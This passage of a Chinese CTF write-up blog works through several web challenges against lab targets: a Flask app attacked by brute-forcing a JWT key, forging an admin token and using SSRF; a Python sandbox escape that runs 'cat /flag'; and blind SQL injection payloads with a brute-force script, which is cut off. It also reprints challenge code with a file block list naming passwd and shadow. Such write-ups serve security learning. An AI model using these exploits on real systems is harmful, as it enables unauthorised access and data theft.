class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> failure_count</span><br><span class="line">    <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username)==password:</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line">        response = make_response(<span class="string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    logged_in = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        text = <span class="string">&quot;Hello, %s!&quot;</span> % data.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        logged_in = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        logged_in = <span class="literal">False</span></span><br><span class="line">        text = <span class="string">&quot;You have not logged in!&quot;</span></span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Home Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 图标能够正常显示耶! --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; text &#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if logged_in %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;登录&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if user==&quot;admin&quot; %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/2.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/1.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, text=text, logged_in=logged_in, user=data.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> verify_token(token)</span><br><span class="line">        resp_text = render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;Admin Panel&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Admin Panel&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt;</span></span><br><span class="line"><span class="string">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;script&gt;</span></span><br><span class="line"><span class="string">                    function execute() &#123;</span></span><br><span class="line"><span class="string">                        fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value,</span></span><br><span class="line"><span class="string">                                      &#123;credentials: &quot;include&quot;&#125;</span></span><br><span class="line"><span class="string">                                      ).then(res =&gt; res.text()).then(data =&gt; &#123;</span></span><br><span class="line"><span class="string">                            document.write(data);</span></span><br><span class="line"><span class="string">                        &#125;);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, api_url=request.host_url+<span class="string">&quot;/api&quot;</span>, url=request.host_url)</span><br><span class="line">        resp = make_response(resp_text)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    api_address = request.args.get(<span class="string">&quot;api_address&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> api_address:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;No api address!&quot;</span>, <span class="number">400</span>)</span><br><span class="line">    response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    resp = make_response(<span class="string">f&quot;Server Info: <span class="subst">&#123;os.popen(<span class="string">&#x27;uname -a&#x27;</span>).read()&#125;</span>&quot;</span>)</span><br><span class="line">    resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:file&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_file</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line">    restricted_keywords = [<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;etc&quot;</span>, </span><br><span class="line">                           <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;boot&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> file <span class="keyword">for</span> keyword <span class="keyword">in</span> restricted_keywords):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;STOP!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./static/&quot;</span> + file):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Not found!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;./static/&quot;</span> + file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>几个关键点：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br><span class="line"></span><br><span class="line">base_key = <span class="built_in">str</span>(uuid.uuid4()).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">secret_key = get_random_number_string(<span class="number">6</span>)</span><br><span class="line">admin_pass = <span class="string">&quot;&quot;</span>.join([ _ <span class="keyword">for</span> _ <span class="keyword">in</span> base_key])</span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: admin_pass,</span><br><span class="line">    <span class="string">&#x27;amiya&#x27;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>admin_pass是不可知的，secret_key是随机6位数字字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> failure_count</span><br><span class="line">        <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            failure_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>验证token的函数，要求user要等于admin，而且不允许爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> failure_count</span><br><span class="line">    <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username)==password:</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line">        response = make_response(<span class="string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="number">401</span>)</span><br></pre></td></tr></table></figure>

<p>users.get(username)，从users中找是否有符合username的键，也就是说username必须是admin或者amiya。</p>
<p>password也必须是users表中的对应的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br></pre></td></tr></table></figure>

<p>可以看到token构造是这样的，数据是{‘user’:username，’exp’:一个持续时间}</p>
<p>然后使用secret_key来作为密钥。</p>
<p>看到这里，我们就有一点思路了，首页的登录可以是users表中的数据，我们可以填amiya和114514来登录。</p>
<p>登录之后我们可以发现app.py源码中还有&#x2F;admin路由，admin使用了verify_token函数作为验证token的函数。</p>
<p>而经过之前的verify_token函数分析，可知要求token得是admin。</p>
<p>我们可以利用之前的token来进行密钥的爆破。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;your_token_here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    key = <span class="built_in">str</span>(i).zfill(<span class="number">6</span>)  <span class="comment"># 补零成6位</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = jwt.decode(token, key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Key found: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以很容易爆破出secret_key，之后可以伪造token</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;690885&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">3600</span>  <span class="comment"># 设置为1小时后过期</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, key, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] JWT Token:&quot;</span>, token)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后把生成的token放进hackbar就可以登录admin了。</p>
<p>登录admin之后发现有execute功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    api_address = request.args.get(<span class="string">&quot;api_address&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> api_address:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;No api address!&quot;</span>, <span class="number">400</span>)</span><br><span class="line">    response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br></pre></td></tr></table></figure>

<p>有句很关键的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br></pre></td></tr></table></figure>

<p>存在ssrf漏洞</p>
<blockquote>
<p>SSRF（<strong>Server-Side Request Forgery</strong>，<strong>服务器端请求伪造</strong>）是一种网络攻击方式。攻击者通过构造请求，诱导目标服务器去访问攻击者指定的地址。攻击的关键是：<strong>不是你的浏览器发请求，而是服务器替你发请求</strong>。</p>
</blockquote>
<p>之后我想通过这个ssrf来访问根目录下的&#x2F;flag，结果发现一直不行，怎么尝试都显示not found</p>
<p>可能是因为根目录下根本没有flag（如果有的话是不是可以在第一部路径穿越的时候就获取？？）</p>
<p>我们在app.py的代码中可以看到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br></pre></td></tr></table></figure>

<p>也就是说app.py同目录下还有flag.py</p>
<p>可以利用路径穿越漏洞来获取flag.py源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_number_string</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"></span><br><span class="line">get_flag = Flask(<span class="string">&quot;get_flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.pop(<span class="string">&quot;ICQ_FLAG&quot;</span>, <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@get_flag.route(<span class="params"><span class="string">&quot;/fl4g&quot;</span></span>)</span></span><br><span class="line"><span class="comment">#如何触发它呢?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure>

<p>在本地开启了一个5001端口，我们刚好可以利用ssrf来访问这个fl4g</p>
<p>在hackbar中构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:32655/execute?api_address=http://127.0.0.1:5001/fl4g</span><br></pre></td></tr></table></figure>

<p>不要忘记cookie要伪造成token&#x3D;…… （user是admin ）的token</p>
<p>这样就能成功拿到flag了</p>
<h1 id="臭皮踩踩背"><a href="#臭皮踩踩背" class="headerlink" title="臭皮踩踩背"></a><strong>臭皮踩踩背</strong></h1><p>python的简单沙箱逃逸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">你被豌豆关在一个监狱里，，，，，，</span><br><span class="line">豌豆百密一疏，不小心遗漏了一些东西，，，</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ev4l</span>(<span class="params">*args</span>):</span><br><span class="line">        <span class="built_in">print</span>(secret)</span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">f = <span class="keyword">lambda</span>: <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(inp, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>, <span class="string">&#x27;f&#x27;</span>: f, <span class="string">&#x27;eval&#x27;</span>: ev4l&#125;))</span><br><span class="line">能不能逃出去给豌豆踩踩背就看你自己了，臭皮，，</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>eval实际上有两个参数，第一个参数就是要eval的字符串，第二个参数就是当前代码的globals，可以理解为全局变量，或者说上下文环境。</p>
<p>可以看到这里的globals设置成了<code>&#123;&quot;__builtins__&quot;: None, &#39;f&#39;: f, &#39;eval&#39;: ev4l&#125;</code></p>
<p>也就是说<code>__builtins__</code>是空了，很多函数都没法直接用了。</p>
<p>但是可以利用f，<code>f.__globals__</code> 仍然可以访问正常的全局变量，之后就可以正常操作了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; f.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line">flag&#123;neWStaR_ctf-Z0ZA2f765d6d13c9&#125;</span><br></pre></td></tr></table></figure>

<p>要注意的是，假如在这里使用了eval ，就需要手动设置一下globals，比如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(</span><br><span class="line">    <span class="string">&#x27;print(1)&#x27;</span>,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: f.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>因为如果不手动设置一下，globals还是None</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/conscience-remain/p/16991530.html">https://www.cnblogs.com/conscience-remain/p/16991530.html</a></p>
</blockquote>
<p>需要用到沙箱逃逸的时候再重新学一下</p>
<h1 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h1><p>ban了很多东西</p>
<p>union ascii  &#x3D;  &#x2F; 等等</p>
<p>思路就是利用下面的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5007</span><span class="operator">/</span>?student_name<span class="operator">=</span>alice<span class="operator">%</span><span class="number">27</span><span class="keyword">AND</span>(ord(MID((<span class="keyword">SELECT</span>(GROUP_CONCAT(schema_name))<span class="keyword">FROM</span>(information_schema.schemata)),<span class="number">1</span>,<span class="number">1</span>))<span class="keyword">in</span>(ord(<span class="operator">%</span><span class="number">27</span>i<span class="operator">%</span><span class="number">27</span>)))<span class="operator">%</span><span class="number">23</span>#</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MID((<span class="keyword">SELECT</span>(GROUP_CONCAT(schema_name))<span class="keyword">FROM</span>(information_schema.schemata)),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>其中这句代码指的是，把(SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata))的结果从第一个字符开始算1个字符（也就是第一个字符）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ord(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))in(ord(%27i%27))</span><br></pre></td></tr></table></figure>

<p>然后取ord函数，得到ascii码，与i的ord比较，是否是i。</p>
<p>如果是i，就为真，response里的text就会有alice，用这个来判断是否正确。</p>
<p>之后就爆破，但是不知道是服务器的限制还是什么，跑了几十次就卡住了。</p>
<p>这里贴一下wp的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&#x27;_-&#123;&#125;&#x27;</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment"># 限制速率，防止请求过快</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这条语句能查询到当前数据库所有的表名</span></span><br><span class="line">        tables = <span class="string">f&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取所有表名的第 i 个字符，并计算 ascii 值</span></span><br><span class="line">        char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;i&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爆破该 ascii 值</span></span><br><span class="line">        b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span></span><br><span class="line">        p = <span class="string">f&#x27;Alice\&#x27;and(<span class="subst">&#123;b&#125;</span>)#&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span 